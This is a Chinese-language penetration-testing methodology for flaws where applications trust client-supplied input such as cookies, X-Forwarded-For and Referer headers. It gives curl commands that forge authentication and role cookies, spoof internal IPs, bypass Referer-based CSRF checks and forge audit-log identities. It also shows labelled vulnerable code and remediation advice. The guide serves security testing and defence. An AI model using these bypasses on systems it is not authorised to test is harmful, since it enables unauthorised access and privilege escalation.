# 不可信输入安全决策攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的不可信输入安全决策攻击检测与利用流程，帮助发现和利用系统依赖不可信输入进行安全决策的设计缺陷。

## 1.2 适用范围

本文档适用于所有使用客户端输入、HTTP 头、Cookie、环境变量等进行安全决策的 Web 应用和系统。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

不可信输入安全决策缺陷是指系统在架构设计层面依赖可被攻击者篡改的输入进行安全决策，导致保护机制可被绕过。

**本质问题**：
- 安全决策依赖不可信数据源
- 缺少输入完整性验证
- 信任假设设计错误
- 状态管理设计缺陷

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-807 | 依赖不可信输入进行安全决策 |
| CWE-693 | 保护机制失效 |
| CWE-302 | 假设不可变数据导致认证绕过 |

### 不可信输入源

```
常见不可信输入源：
├── HTTP 请求
│   ├── 参数 (GET/POST)
│   ├── Cookie
│   ├── HTTP 头
│   └── URL 路径
├── 客户端状态
│   ├── 隐藏表单字段
│   ├── localStorage
│   └── sessionStorage
├── 环境变量
├── DNS 查询结果
└── 外部 API 响应
```

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 安全决策点 | 风险点描述 |
|---------|-----------|-----------|
| 认证系统 | Cookie 认证状态 | 伪造认证状态 |
| 权限控制 | 角色/权限参数 | 权限提升 |
| IP 限制 | X-Forwarded-For | IP 欺骗绕过 |
| 速率限制 | 客户端标识 | 限制绕过 |
| CSRF 防护 | Referer 头 | CSRF 绕过 |
| 审计日志 | 用户标识 | 日志伪造 |
| 会话管理 | 会话状态 | 会话劫持 |
| 访问控制 | 来源验证 | 未授权访问 |

## 2.3 漏洞发现方法

### 2.3.1 Cookie 依赖检测

**步骤 1：识别认证 Cookie**

```bash
# 登录应用，观察设置的 Cookie
Set-Cookie: authenticated=true
Set-Cookie: role=user
Set-Cookie: isAdmin=0
```

**步骤 2：篡改 Cookie 测试**

```bash
# 修改认证状态
Cookie: authenticated=true
Cookie: isLoggedIn=1
Cookie: auth=yes

# 修改权限标识
Cookie: role=admin
Cookie: userType=superuser
Cookie: privilege=999

# 修改布尔值
Cookie: isAdmin=1
Cookie: canDelete=true
Cookie: hasAccess=yes
```

**步骤 3：验证服务端响应**

```bash
# 访问需要认证的页面
curl -H "Cookie: authenticated=true" https://target.com/admin

# 访问需要特权的操作
curl -H "Cookie: role=admin" https://target.com/api/deleteUser
```

### 2.3.2 HTTP 头依赖检测

**IP 地址欺骗测试**

```bash
# 常见 IP 头
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1  # Cloudflare

# 测试内部 IP 绕过
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin

# 测试白名单 IP 绕过
curl -H "X-Forwarded-For: 10.0.0.1" https://target.com/internal
```

**Referer 依赖测试**

```bash
# CSRF 防护依赖 Referer
curl -H "Referer: https://target.com/safe-page" \
     -H "Origin: https://target.com" \
     https://target.com/api/changePassword

# 测试 Referer 验证是否严格
curl -H "Referer: https://target.com.evil.com" \
     https://target.com/api/transfer
```

**内部头注入测试**

```bash
# 某些应用信任特定内部头
X-Internal-Request: true
X-From-Service: trusted-service
X-Admin-Request: 1
X-Verified-Request: yes
```

### 2.3.3 环境变量依赖检测

**DNS 信任测试**

```bash
# 如果系统使用反向 DNS 验证

# 1. 修改本地 hosts 文件
echo "127.0.0.1 trustme.example.com" >> /etc/hosts

# 2. 测试系统是否信任伪造的 DNS 解析
```

**环境变量注入**

```bash
# 通过进程注入修改环境变量
# 某些 CGI 应用可能受影响
```

### 2.3.4 代码审计

**危险代码模式检测**

```java
// ❌ 危险模式：直接信任 Cookie
Cookie[] cookies = request.getCookies();
for (Cookie c : cookies) {
    if (c.getName().equals("authenticated") && 
        c.getValue().equals("true")) {
        authenticated = true;  // 可被伪造
    }
}
```

```php
// ❌ 危险模式：Cookie 认证
if (!$_COOKIE['authenticated']) {
    // 认证逻辑
}
// 攻击者设置 authenticated=1 即可绕过

// ❌ 危险模式：IP 头信任
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
if ($ip === '127.0.0.1') {
    // 授予特权
}
```

```python
# ❌ 危险模式：头信任
def is_admin(request):
    return request.headers.get('X-Admin-Role') == 'true'
```

## 2.4 漏洞利用方法

### 2.4.1 认证状态伪造

```bash
# 场景：Cookie 认证状态

# 1. 识别认证 Cookie 名称
# 常见名称：authenticated, isLoggedIn, auth, session

# 2. 尝试设置认证值
Cookie: authenticated=true
Cookie: isLoggedIn=1
Cookie: auth=yes
Cookie: session=deleted_session_id

# 3. 访问需要认证的资源
curl -H "Cookie: authenticated=true" \
     https://target.com/user/profile
```

### 2.4.2 权限提升

```bash
# 场景：角色 Cookie 控制

# 1. 以普通用户登录，观察 Cookie
Cookie: role=user
Cookie: userType=normal

# 2. 修改为高权限角色
Cookie: role=admin
Cookie: userType=superuser
Cookie: privilegeLevel=999

# 3. 访问管理员功能
curl -H "Cookie: role=admin" \
     https://target.com/admin/users
```

### 2.4.3 IP 限制绕过

```bash
# 场景：基于 IP 的访问控制

# 1. 识别 IP 验证逻辑
# 通常用于管理后台、内部 API

# 2. 伪造内部 IP
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     https://target.com/admin

# 3. 伪造白名单 IP
curl -H "X-Forwarded-For: 10.0.0.1" \
     https://target.com/internal/api
```

### 2.4.4 速率限制绕过

```bash
# 场景：基于客户端标识的速率限制

# 1. 识别速率限制键
# 可能是 IP、Cookie、设备指纹

# 2. 轮换标识
# 每次请求使用不同的标识
# Cookie: client_id=random_uuid

# 3. 或使用多个客户端
# 分布式请求绕过限制
```

### 2.4.5 CSRF 防护绕过

```bash
# 场景：Referer 验证

# 1. 识别 Referer 验证逻辑
# 检查 Referer 是否来自同域

# 2. 尝试绕过
# - 空 Referer
# - 子域名
# - 相似域名

curl -H "Referer: " \
     https://target.com/api/transfer

curl -H "Referer: https://target.com.evil.com" \
     https://target.com/api/transfer

curl -H "Referer: https://admin.target.com" \
     https://target.com/api/deleteUser
```

### 2.4.6 会话状态篡改

```bash
# 场景：服务端会话管理缺陷

# 1. 获取有效会话 ID
# 通过 XSS、日志泄露等

# 2. 重放会话
Cookie: session=stolen_session_id

# 3. 如果会话无绑定
# 可在不同 IP/设备使用
```

### 2.4.7 审计日志伪造

```bash
# 场景：日志记录依赖客户端输入

# 1. 识别日志记录点
# 用户 ID、操作类型等

# 2. 注入恶意日志
curl -H "X-User-ID: admin" \
     https://target.com/api/action

# 3. 日志显示 admin 执行了操作
# 实际是攻击者
```

## 2.5 漏洞利用绕过方法

### 2.5.1 验证逻辑绕过

**技巧 1：类型混淆**

```bash
# 服务端期望布尔值
Cookie: isAdmin=false

# 尝试不同类型
Cookie: isAdmin=0      # 数字 0
Cookie: isAdmin=null   # 空值
Cookie: isAdmin=""     # 空字符串
Cookie: isAdmin=[]     # 空数组
```

**技巧 2：参数污染**

```bash
# 发送多个同名参数
Cookie: role=user; role=admin

# 服务端可能使用第一个或最后一个
```

**技巧 3：大小写绕过**

```bash
# 如果验证是大小写敏感的
Cookie: Role=admin
Cookie: ROLE=admin
Cookie: IsAdmin=true
```

### 2.5.2 多层验证绕过

```
场景：多层安全决策

第一层：IP 检查
第二层：Cookie 验证
第三层：Token 验证

绕过策略：
1. 找到最弱的一层
2. 集中攻击该层
3. 不需要绕过所有层
```

### 2.5.3 时间窗口利用

```bash
# 场景：状态检查与使用存在时间窗口

# 1. 在检查后、使用前发起攻击
# 2. 利用竞态条件
# 3. 类似 TOCTOU 攻击
```

---

# 第三部分：附录

## 3.1 不可信输入测试检查清单

```
□ Cookie 认证状态测试
□ Cookie 权限标识测试
□ X-Forwarded-For 头测试
□ X-Real-IP 头测试
□ Referer 验证测试
□ Origin 头测试
□ 自定义内部头测试
□ 隐藏表单字段测试
□ URL 参数安全决策测试
□ 环境变量依赖测试
□ DNS 信任测试
□ 外部 API 响应信任测试
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Suite | 请求篡改 | https://portswigger.net/burp |
| OWASP ZAP | 自动化扫描 | https://www.zaproxy.org/ |
| Cookie Editor | Cookie 管理 | 浏览器扩展 |
| 自定义脚本 | 批量测试 | Python |

## 3.3 修复建议

### 架构设计层面

1. **服务端状态管理** - 所有安全状态存储在服务端
2. **零信任架构** - 不信任任何客户端输入
3. **完整性保护** - 使用 HMAC 签名保护客户端状态

### 实现层面

```java
// ✅ 推荐做法：服务端会话管理
// 仅在服务端存储认证状态
Session session = getSession();
session.setAttribute("authenticated", true);
session.setAttribute("role", "user");

// 客户端仅持有会话 ID
// Cookie: JSESSIONID=xxx
```

```php
// ✅ 推荐做法：HMAC 签名
$userId = $_COOKIE['user_id'];
$signature = $_COOKIE['signature'];

$expectedSignature = hash_hmac('sha256', $userId, $secretKey);

if (!hash_equals($expectedSignature, $signature)) {
    die('Invalid signature');
}
```

### 验证层面

1. **双重验证** - 客户端检查必须在服务端重复执行
2. **输入识别** - 识别所有不可信输入源
3. **最小信任** - 默认不信任，验证后信任

---

**参考资源**：
- [CWE-807: Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html)
- [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)
- [OWASP Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
